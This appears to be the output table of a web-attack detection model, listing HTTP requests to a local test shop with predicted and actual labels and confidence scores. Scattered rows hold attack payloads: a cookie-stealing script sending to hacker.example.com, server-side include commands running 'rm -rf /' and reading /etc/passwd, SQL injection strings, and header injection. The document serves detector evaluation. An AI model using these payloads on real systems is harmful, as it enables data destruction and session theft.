Prediction, Actual, Confidence, Method, Content, URL
1, 1, 80.83%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5592&B1A=Confirmar HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
0, 1, 65.65%, GET, , http://localhost:8080/tienda1/miembros/fotos.jsp/4861362529278789730 HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1, 0, 75.81%, POST, modo=registro&login=tapani9&password=ep9scopologio&nombre=Seliem&apellidos=Crous+Zuta&email=kappeler-flick%40probandoo.mobi&dni=82444604T&direccion=Calle+Capitan+Palacios+71+&ciudad=Laguna+del+Marquesado&cp=12449&provincia=La+Rioja&ntc=1595247568175334&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 0, 99.52%, GET, , http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
1, 0, 72.23%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nadir&password=ENaRdEcedoRa&nombre=Gerino&apellidos=Mont%E1vez+Zurita&email=nassiet.birkin%40cienciapolicial.gl&dni=70075138A&direccion=C%2F+Moriles+91+&ciudad=Jorquera&cp=25324&provincia=Zamora&ntc=5230108987533758&B1=Registrar HTTP/1.1
1, 1, 94.45%, GET, , http://localhost:8080/tienda1/6909030637832563290.jsp HTTP/1.1
1, 1, 81.39%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lodesert&password=heRramienTa&nombre=Edelmira&apellidos=Capo+Garc%EDa&email=bugbee%40farma-job.cd&dni=55645514G&direccion=C%2F+Santander+S%2FN%2C+&ciudad=Roca+de+la+Sierra%2C+La&cp=05289&provincia=Badajoz&ntc=686788257238725&B1=Registrar HTTP/1.1
1, 1, 84.19%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shibo&pwd=3l8rinet03ta&remember=on%2F&B1=Entrar HTTP/1.1
1, 1, 85.25%, POST, id=3&nombre=Vino+Rioja&precio=39%2F&cantidad=81&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 1, 99.91%, POST, modo=entrar&login=wing-man7%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&pwd=edific9r&remember=on&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 1, 99.97%, POST, modo=registrosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&login=wendy&password=a-h%EDlo&nombre=Edelvais&apellidos=Alba%F1il+Comasoli&email=raidhi_altermen%40prestamosypersonales.kw&dni=68675744K&direccion=Puerto+De+Canfranc+179%2C+&ciudad=Mont%F3n&cp=12415&provincia=Guadalajara&ntc=8960280484576559&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 88.71%, POST, id=2&nombre=Vino+.*%3FRioja&precio=100&cantidad=32&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 94.68%, POST, errorMsg=Credenciales+incorrectas, http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1, 1, 63.77%, POST, modo=entrar&login=hatti&pwd=C%2790B170%EDA&remember=off&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0, 0, 94.64%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
1, 1, 74.33%, POST, id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=42&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 0, 50.99%, POST, modo=insertar&precio=8005&B1=Pasar+por+caja, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1, 1, 91.29%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
1, 0, 58.38%, POST, modo=entrar&login=lonnie&pwd=clivosa&remember=off&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 1, 91.29%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
0, 0, 99.29%, GET, , http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
1, 1, 65.88%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=burch&pwd=066empe0a6c0a%252B&remember=on&B1=Entrar HTTP/1.1
0, 0, 99.54%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1, 1, 98.54%, GET, , http://localhost:8080/tienda1/4861362529278789730.Old HTTP/1.1
1, 0, 64.88%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=chungen&password=6r_o733300e&nombre=Argentino&apellidos=Gallart+Coc%F3m&email=edmunds.emil%40carimartin.io&dni=80483953F&direccion=Glorieta+Antonio+Molina+87%2C+&ciudad=Sari%F1ena&cp=42223&provincia=Guadalajara&ntc=6206191254660151&B1=Registrar HTTP/1.1
1, 1, 70.03%, POST, modo=registro&login=uunko7&password=cHopAl&nombre=Tr%E1nsito&apellidos=Montemayor+Lillo&email=bagdasarian%40lola-lutscht.pe&dni=88623470P&direccion=Carrer+Trieta+125+&ciudad=Calles&cp=25440&provincia=Teruel&ntc=%252B&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 85.76%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=68&B1=A%F1adir+al+carrito HTTP/1.1
1, 1, 76.55%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=austin&password=va%ED6A&nombre=Dami%E1n&apellidos=Haddock&emailA=ryder%40mataluenga.zm&dni=12773567B&direccion=Oasis%2C+89+&ciudad=Y%E9meda&cp=42181&provincia=A+Coru%F1a&ntc=1457291251258810&B1=Registrar HTTP/1.1
0, 0, 97.15%, GET, , http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
0, 0, 99.54%, GET, , http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0, 0, 99.33%, GET, , http://localhost:8080/tienda1/index.jsp HTTP/1.1
1, 0, 62.19%, POST, modo=registro&login=chung&password=reele.cto&nombre=Franklin&apellidos=Iranzo&email=roussel%40santacruzdelvoto.ws&dni=96269598Q&direccion=Calle+Bernat+De+Santa+Eugenia+90+&ciudad=Sariego&cp=17850&provincia=Huesca&ntc=7626699319590675&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 99.93%, GET, , http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0, 1, 52.02%, GET, , http://localhost:8080/tienda1/publico/productos.jsp/4861362529278789730~ HTTP/1.1
1, 1, 81.36%, POST, modo=insertar&precio=157&B1A=Pasar+por+caja, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
0, 0, 94.64%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
1, 1, 86.29%, GET, , http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tat7&password=p0on57cia008nto&nombre=Camelia&apellidos=Zurita+Santander&email=diessl-claver%40tradedeficit.mz&dniA=59059811C&direccion=Artes%2C+S%2FN+&ciudad=Escobar+de+Polendos&cp=18518&provincia=Burgos&ntc=2636619315022095&B1=Registrar HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
0, 0, 99.78%, GET, , http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
0, 0, 99.09%, GET, , http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1, 1, 60.64%, POST, modo=entrar&login=slunder&pwd=favo%27recie%2Fn%27te&remember=off&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 1, 92.02%, POST, modoA=insertar&precio=7525&B1=Confirmar, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1, 1, 99.95%, POST, modo=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&precio=8166&B1=Confirmar, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0, 1, 52.88%, POST, modo=registro&login=e*berle&password=178gaTorIO&nombre=Guida&apellidos=Maquieira+San+Segundo&email=glaessner-alwood%40softwaremasservicio.ic&dni=29189199Z&direccion=Redonda%2C+142%2C+13-G&ciudad=R%E1bade&cp=08673&provincia=Le%F3n&ntc=7739977532136253&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 94.64%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
1, 1, 99.99%, POST, id=3&nombre=Vino+Rioja&precio=39&cantidad=4&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 1, 81.97%, GET, , http://localhost:8080/admin5.nsf HTTP/1.1
1, 0, 59.03%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=53&B1=A%F1adir+al+carrito HTTP/1.1
0, 0, 99.87%, GET, , http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0, 0, 99.93%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1, 1, 90.48%, POST, idA=1, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1, 0, 53.38%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=96&B1=A%F1adir+al+carrito HTTP/1.1
0, 0, 94.64%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1, 1, 81.37%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=lieure&password=rEbatible&nombre=Tarciano&apellidos=Villalta+Tapasco&email=touret%40artesania.org.cv&dni=42708654T&direccion=Calle+Eduardo+Blanco+Amor%2C+120%2C+1%3FB&ciudad=Sopeira&cp=12230&provincia=Guadalajara&ntc=7642131917731646&B1=Registrar HTTP/1.1
0, 0, 99.87%, GET, , http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
1, 0, 80.80%, POST, id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=34&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 99.62%, GET, , http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
1, 1, 99.91%, POST, id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1, 1, 89.43%, PUT, id=3&nombre=Vino+Rioja&precio=85&cantidad=84&B1=A%F1adir+al+carrito, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0, 0, 98.74%, GET, , http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
1, 1, 81.23%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=suilin&password=654261ITU2A&nombre=Ailsa&apellidos=Llens+Capmany&email=fleugel%40tantomontamontatanto.lc&dni=31564707J&direccion=Glorieta+Liquidambar%2C+S%2FN%2C+13%3FF&ciudad=Puebla+del+Salvador&cp=24438&provincia=Huelva&ntc=2227850098385549&B1=Registrar HTTP/1.1
1, 1, 78.01%, POST, modo=registro&login=arron&password=boDegoNcillo&nombreA=Betiana&apellidos=Argente+Botifoll&email=peckinpah-keams%40juguetespersonales.tz&dni=10867689M&direccion=Periodista+Juanito+Cortes%2C+95+&ciudad=Marug%E1n&cp=38770&provincia=Badajoz&ntc=6222371193056945&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 89.22%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7810&B1=Confirmar%2F HTTP/1.1
1, 0, 69.79%, POST, modo=registro&login=oblak&password=08Tiro72&nombre=Brisia&apellidos=Borrachero+Muros&email=swanson%40sexl.co&dni=51734480M&direccion=C%2F+Grabador+David+Roberts+154+1-H&ciudad=San+Mart%EDn+y+Mudri%E1n&cp=01169&provincia=Burgos&ntc=8961981301450385&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 96.06%, GET, , http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
0, 0, 99.52%, GET, , http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
1, 1, 99.99%, POST, id=2&nombre=Vino+Rioja&precio=39&cantidad=25&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E, http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1, 1, 89.22%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3299&B1=Confirmar%2F HTTP/1.1
1, 1, 76.24%, PUT, modo=registro&login=maludzin&password=*hiNTeRo&nombre=Isauro&apellidos=C%F3zar+Ortega&email=knaup%40ilusionarium.by&dni=30143184M&direccion=Cerro+Animas+199%2C+8%3FG&ciudad=Bentarique&cp=08270&provincia=Teruel&ntc=5095373752411795&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 1, 78.65%, POST, modo=entrar&login=tahani97&pwd=tije972e9&rememberA=off&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 1, 98.21%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7105%22+AND+%221%22%3D%221&B1=Pasar+por+caja HTTP/1.1
0, 0, 99.87%, GET, , http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
1, 1, 66.36%, GET, , http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rockford&password=eng68nd13i8ient5&nombre=Saiguen&apellidosA=Gramunt+Alzuria&email=berthels-dahlbeck%40muevemiweb.br&dni=87238782N&direccion=Pozo+188+3%3FG&ciudad=C%E1ceres&cp=06197&provincia=Valencia&ntc=8495227312439801&B1=Registrar HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0, 0, 60.96%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=978&B1=Confirmar HTTP/1.1
1, 1, 98.22%, GET, , http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif/.Old HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1, 1, 95.91%, POST, modo=registro&login=kopell&password=moFl99UDO&nombre=Secundino&apellidos=Pazar%E1n+Totozauz&email=eustrel%40cincocolores.md&dni=35507034W&direccion=C%2F+Casal-sampaio%2C+24%2C+&ciudad=%27OR%27a%3D%27a&cp=12123&provincia=Le%F3n&ntc=3540945192735451&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 78.35%, PUT, id=2, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1, 1, 52.17%, POST, modo=entrar&login=dulsea&pwd=puzolana&remember=+&B1=Entrar, http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1, 0, 69.91%, POST, modo=registro&login=sharron&password=am6456ra&nombre=Enio&apellidos=Ull%E9s&email=stovin%40escuelamontessori.zr&dni=82063475G&direccion=Calle+Santa+Barbara%2C+17+7C&ciudad=Villanueva+del+Conde&cp=14860&provincia=Madrid&ntc=7509082311963954&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 99.87%, GET, , http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0, 0, 99.93%, GET, , http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0, 0, 99.87%, GET, , http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
1, 1, 96.17%, GET, , http://localhost:8080/tienda1/.inc HTTP/1.1
1, 1, 99.85%, POST, modo=registro&login=simler&password=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&nombre=Trist%E1n&apellidos=Padura+Lacruz&email=aasen%40apelton.dk&dni=90088544M&direccion=Gaspar+Arenas+116%2C+&ciudad=San+Xo%E1n+de+R%EDo&cp=22560&provincia=Lugo&ntc=7844692767857454&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0, 0, 53.84%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9817&B1=Pasar+por+caja HTTP/1.1
0, 0, 99.09%, GET, , http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1, 0, 63.96%, POST, modo=registro&login=brier&password=grajear&nombre=Yaci&apellidos=Aznar&email=mamukos4%40culturalsanpedrocf.uk&dni=12354547M&direccion=Rua+Principal%2C+176+&ciudad=Villanueva+de+Carazo&cp=04276&provincia=Navarra&ntc=1734128437321844&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 86.18%, GET, , http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7990&B1=Pasar+por+caja%2F HTTP/1.1
0, 0, 76.38%, POST, id=1, http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0, 0, 99.89%, GET, , http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0, 0, 99.62%, GET, , http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
1, 1, 96.30%, POST, modo=registro&login=veen&password=sar*gent%EDa&nombre=Vigilio&apellidos=Mitjavila+Oca&email=seeck%40lawn.gu&dni=%27+AND+%271%27%3D%271&direccion=Calle+Ripolles+83%2C+&ciudad=Valderr%E1bano&cp=16812&provincia=Valencia&ntc=7619192104254644&B1=Registrar, http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1, 1, 99.39%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif HTTP/1.1
0, 0, 99.46%, GET, , http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1, 1, 68.96%, GET, , http://localhost:8080/worldmusic/action/catalog HTTP/1.1
0, 0, 99.29%, GET, , http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
0, 0, 84.62%, POST, B2=Vaciar+carrito, http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
0, 0, 99.09%, GET, , http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1, 0, 61.44%, POST, modo=registro&login=marko&password=7ri87At0&nombre=Edi&apellidos=Bagot+Alzogaray&email=elliman.kane%40doloresmusculares.tt&dni=46819300V&direccion=Moncayo+46%2C+&ciudad=Solanillos+del+Extremo&cp=26414&provincia=A+Coru%F1a&ntc=9965289480263638&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0, 0, 51.59%, GET, , http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=16&B1=A%F1adir+al+carrito HTTP/1.1
0, 0, 97.15%, GET, , http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
1, 1, 60.62%, GET, , http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%252B HTTP/1.1
0, 0, 99.78%, GET, , http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
1, 1, 70.18%, POST, modo=registro&login=jarn%2Cak&password=DEsFaVoREcEr&nombre=Humildad&apellidos=Sanagua+Manzano&email=polakov_gaar%40rocofer.kh&dni=08092387K&direccion=Plaza+Del+Ensanche+33+12-A&ciudad=Lantadilla&cp=47494&provincia=Barcelona&ntc=7269685005406130&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1, 0, 50.86%, GET, , http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bohyun&pwd=1illabarqu%ED2&remember=on&B1=Entrar HTTP/1.1
1, 1, 91.14%, POST, modoA=insertar&precio=5029&B1=Pasar+por+caja, http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0, 1, 87.06%, GET, , http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.Bak HTTP/1.1
1, 1, 90.47%, GET, , http://localhost:8080/tienda1/publico/registro.jsp.java HTTP/1.1
1, 1, 68.68%, POST, modo=registro&login=bao&password=val%ED&nombre=Norberta&apellidos=Poller+Saravia&email=bervil%40tetdevel%40ocidad%40.s%40t&dni=12690729L&direccion=C%2F+Valls+30%2C+10-F&ciudad=Luciana&cp=02316&provincia=Salamanca&ntc=0204088681426033&B1=Registrar, http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
